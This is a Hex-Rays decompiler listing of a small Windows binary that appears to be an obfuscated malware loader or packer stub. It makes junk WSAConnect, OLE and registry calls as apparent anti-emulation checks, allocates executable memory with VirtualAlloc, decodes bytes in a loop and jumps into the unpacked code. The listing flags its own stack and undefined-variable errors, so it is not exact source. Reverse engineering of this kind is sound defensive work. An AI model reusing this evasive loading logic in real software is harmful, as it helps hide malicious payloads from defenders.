/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
void __cdecl start(char *a1, SIZE_T a2, DWORD a3, DWORD a4);
// LPVOID __userpurge sub_4013B6@<eax>(int a1@<ecx>, int a2@<ebp>, int a3@<esi>, void *a4, SIZE_T a5, DWORD a6, DWORD a7);
// LPVOID __userpurge sub_4013C1@<eax>(int a1@<ecx>, int a2@<ebp>, int a3@<esi>, void *a4, SIZE_T a5, DWORD a6, DWORD a7);
void __stdcall sub_401420(int a1);
// HRESULT __stdcall OleSave(LPPERSISTSTORAGE pPS, LPSTORAGE pStg, BOOL fSameAsLoad);
// HRESULT __stdcall OleLoad(LPSTORAGE pStg, const IID *const riid, LPOLECLIENTSITE pClientSite, LPVOID *ppvObj);
// LSTATUS __stdcall RegDeleteValueW(HKEY hKey, LPCWSTR lpValueName);
// LSTATUS __stdcall RegDeleteValueA(HKEY hKey, LPCSTR lpValueName);
// int __stdcall WSAConnect(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
// OLESTATUS __stdcall OleClone(LPOLEOBJECT, LPOLECLIENT, LHCLIENTDOC, LPCSTR, LPOLEOBJECT *);


//----- (00401128) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __cdecl start(char *a1, SIZE_T a2, DWORD a3, DWORD a4)
{
  ULONG v4; // eax
  int v5; // edx
  int v6; // edx
  char v7; // al
  int v8; // ebx
  char v9; // al
  int v10; // ebx
  char *v11; // eax
  _DWORD *v12; // eax
  char v13; // cf
  int v14; // ecx
  int v15; // eax
  ULONG v16; // esi
  void *v17; // esp
  unsigned int v18; // edx
  int v19; // ecx
  SIZE_T v20; // ebx
  unsigned int v21; // eax
  unsigned int i; // [esp+0h] [ebp-1ACh]
  char v23[332]; // [esp+4h] [ebp-1A8h] BYREF
  struct _QualityOfService s; // [esp+150h] [ebp-5Ch] BYREF
  int v25; // [esp+198h] [ebp-14h]
  int *v26; // [esp+19Ch] [ebp-10h]
  SIZE_T v27; // [esp+1A0h] [ebp-Ch]
  unsigned int v28; // [esp+1A4h] [ebp-8h]
  DWORD v29; // [esp+1A8h] [ebp-4h]
  int vars0; // [esp+1ACh] [ebp+0h] BYREF

  v26 = (int *)v14;
  v25 = -596;
  s.SendingFlowspec.TokenRate = 0;
  v15 = WSAConnect((SOCKET)&s, (const struct sockaddr *)&s, (int)&s, (LPWSABUF)&s, (LPWSABUF)&s, &s, &s);
  v16 = v29;
  v17 = alloca((v15 ^ v25) + 1);
  v18 = v28;
  v29 = (DWORD)v26;
  v28 = v16;
  v26 = &vars0;
  v19 = 0xFFFF;
  while ( 1 )
  {
    v18 ^= v15;
    v15 += 16;
    if ( v15 == -17958178 )
      break;
    if ( !--v19 )
    {
      s.SendingFlowspec.TokenRate = 0;
      if ( WSAConnect((SOCKET)&s, (const struct sockaddr *)&s, (int)&s, (LPWSABUF)&s, (LPWSABUF)&s, &s, &s) == -1 )
      {
        s.SendingFlowspec.DelayVariation = 0;
        if ( OleClone(
               (LPOLEOBJECT)&s.SendingFlowspec.DelayVariation,
               (LPOLECLIENT)&s.SendingFlowspec.DelayVariation,
               (LHCLIENTDOC)&s.SendingFlowspec.DelayVariation,
               (LPCSTR)&s.SendingFlowspec.DelayVariation,
               (LPOLEOBJECT *)&s.SendingFlowspec.DelayVariation) == OLE_ERROR_OBJECT
          && OleLoad(0, 0, 0, 0) == -2147024809
          && RegDeleteValueW(HKEY_PERFORMANCE_DATA, 0) == 6 )
        {
          s.SendingFlowspec.ServiceType = 0;
          v27 += 2146436741;
          v20 = v27;
          v27 -= 2146436741;
          v29 &= v27;
          v27 += v27 - (2142213765 - v20);
          v26 = (int *)v23;
          v29 -= 48;
          v29 = ~v29;
          sub_4013C1(-1, (int)&vars0, (int)v23, v23, v27, ++v29, 0x4147C8u);
          v28 = 0;
          s.ProviderSpecific.buf = 0;
          v21 = (unsigned int)VirtualAlloc(0, (SIZE_T)&s.ReceivingFlowspec.MaxSduSize, 0x3000u, 0x40u);
          v28 |= v21;
          s.ReceivingFlowspec.MinimumPolicedSize = 0x400000;
          for ( i = 0; i < v26[2]; ++i )
          {
            s.ReceivingFlowspec.MinimumPolicedSize = s.ReceivingFlowspec.ServiceType;
            sub_4013B6(
              (int)&s.ProviderSpecific.buf[v28],
              (int)&vars0,
              i,
              &s.ProviderSpecific.buf[v28],
              *(_DWORD *)s.ProviderSpecific.len + s.ReceivingFlowspec.ServiceType,
              *(_DWORD *)(s.ProviderSpecific.len + 4),
              s.ReceivingFlowspec.ServiceType);
            s.ProviderSpecific.buf += *(_DWORD *)(s.ProviderSpecific.len + 4);
            s.ProviderSpecific.len += 8;
          }
          JUMPOUT(0x4013CF);
        }
        v25 = 0;
        s.ProviderSpecific.buf = 0;
        OleSave(0, 0, 0);
        RegDeleteValueA(HKEY_PERFORMANCE_DATA, 0);
        return;
      }
      break;
    }
  }
  v25 = (int)&vars0;
  s.ProviderSpecific.buf = (CHAR *)v19;
  s.ProviderSpecific.len = v16;
  v4 = WSAConnect((SOCKET)&s, (const struct sockaddr *)&s, (int)&s, (LPWSABUF)&s, (LPWSABUF)&s, &s, &s) + 1;
  v6 = v4 & v5;
  v29 &= v6;
  v28 &= v6;
  s.ReceivingFlowspec.MinimumPolicedSize = v6;
  v27 &= v6;
  s.ReceivingFlowspec.MaxSduSize = v4;
  s.ReceivingFlowspec.ServiceType = v4;
  --v27;
  s.SendingFlowspec.TokenRate = 0;
  if ( WSAConnect((SOCKET)&s, (const struct sockaddr *)&s, (int)&s, (LPWSABUF)&s, (LPWSABUF)&s, &s, &s) == -1 )
  {
    while ( v28 < a3 )
    {
      v25 = ~*(_DWORD *)(v28 + a2);
      v7 = ~(v25 | (-(char)v27 - 1));
      v8 = *(_DWORD *)(v29 + a4);
      v25 = -1;
      v9 = v7 - v8;
      v28 = -v28;
      v26 = (int *)&a1[-v28];
      v10 = *(_DWORD *)&a1[-v28];
      LOBYTE(v10) = v9;
      v11 = &a1[-v28];
      v28 = -v28;
      *(_DWORD *)v11 = 0;
      sub_401420((int)v11);
      *v12 = v13 + *v12 - v10;
      vars0 = (v25 ^ *v12) + 1;
      if ( ++v29 == 1 )
        v29 = 0;
      if ( v29 == 154 )
        break;
      s.ReceivingFlowspec.MinimumPolicedSize = (ULONG)v12;
      v28 -= v27;
    }
  }
  else
  {
    VirtualAlloc(a1, a2, a3, a4);
  }
}
// 40135A: control flows out of bounds to 4013CF
// 40114F: bad sp value at call
// 401198: bad sp value at call
// 4011B2: bad sp value at call
// 4012DE: bad sp value at call
// 401018: bad sp value at call
// 401045: bad sp value at call
// 40113C: variable 'v14' is possibly undefined
// 401330: variable 'v12' is possibly undefined
// 401005: variable 'v19' is possibly undefined
// 40101F: variable 'v5' is possibly undefined
// 4010ED: variable 'v13' is possibly undefined

//----- (004013B6) --------------------------------------------------------
LPVOID __userpurge sub_4013B6@<eax>(int a1@<ecx>, int a2@<ebp>, int a3@<esi>, void *a4, SIZE_T a5, DWORD a6, DWORD a7)
{
  int v7; // eax
  int v8; // edx
  int v9; // edx
  int v11; // [esp-2Ch] [ebp-2Ch]
  int v12; // [esp-28h] [ebp-28h]
  int v13; // [esp-24h] [ebp-24h]
  int v14; // [esp-20h] [ebp-20h]
  int v15; // [esp-1Ch] [ebp-1Ch]
  _DWORD v16[6]; // [esp-18h] [ebp-18h] BYREF

  v16[0] = a2;
  v15 = a1;
  v14 = a3;
  v16[-23] = 0;
  v7 = WSAConnect(
         (SOCKET)&v16[-23],
         (const struct sockaddr *)&v16[-23],
         (int)&v16[-23],
         (LPWSABUF)&v16[-23],
         (LPWSABUF)&v16[-23],
         (LPQOS)&v16[-23],
         (LPQOS)&v16[-23])
     + 1;
  v9 = v7 & v8;
  v15 &= v9;
  v14 &= v9;
  v12 = v7;
  v11 = v7;
  v13 = v9 - 1;
  v16[-23] = 0;
  if ( WSAConnect(
         (SOCKET)&v16[-23],
         (const struct sockaddr *)&v16[-23],
         (int)&v16[-23],
         (LPWSABUF)&v16[-23],
         (LPWSABUF)&v16[-23],
         (LPQOS)&v16[-23],
         (LPQOS)&v16[-23]) == -1 )
    JUMPOUT(0x401067);
  return VirtualAlloc(a4, a5, a6, a7);
}
// 40104C: control flows out of bounds to 401067
// 40101F: variable 'v8' is possibly undefined

//----- (004013C1) --------------------------------------------------------
LPVOID __userpurge sub_4013C1@<eax>(int a1@<ecx>, int a2@<ebp>, int a3@<esi>, void *a4, SIZE_T a5, DWORD a6, DWORD a7)
{
  int v7; // eax
  int v8; // edx
  int v9; // edx
  int v11; // [esp-2Ch] [ebp-2Ch]
  int v12; // [esp-28h] [ebp-28h]
  int v13; // [esp-24h] [ebp-24h]
  int v14; // [esp-20h] [ebp-20h]
  int v15; // [esp-1Ch] [ebp-1Ch]
  _DWORD v16[6]; // [esp-18h] [ebp-18h] BYREF

  v16[0] = a2;
  v15 = a1;
  v14 = a3;
  v16[-23] = 0;
  v7 = WSAConnect(
         (SOCKET)&v16[-23],
         (const struct sockaddr *)&v16[-23],
         (int)&v16[-23],
         (LPWSABUF)&v16[-23],
         (LPWSABUF)&v16[-23],
         (LPQOS)&v16[-23],
         (LPQOS)&v16[-23])
     + 1;
  v9 = v7 & v8;
  v15 &= v9;
  v14 &= v9;
  v12 = v7;
  v11 = v7;
  v13 = v9 - 1;
  v16[-23] = 0;
  if ( WSAConnect(
         (SOCKET)&v16[-23],
         (const struct sockaddr *)&v16[-23],
         (int)&v16[-23],
         (LPWSABUF)&v16[-23],
         (LPWSABUF)&v16[-23],
         (LPQOS)&v16[-23],
         (LPQOS)&v16[-23]) == -1 )
    JUMPOUT(0x401067);
  return VirtualAlloc(a4, a5, a6, a7);
}
// 40104C: control flows out of bounds to 401067
// 40101F: variable 'v8' is possibly undefined

//----- (00401420) --------------------------------------------------------
void __stdcall sub_401420(int a1)
{
  ;
}

// nfuncs=5 queued=4 decompiled=4 lumina nreq=0 worse=0 better=0
// ALL OK, 4 function(s) have been successfully decompiled
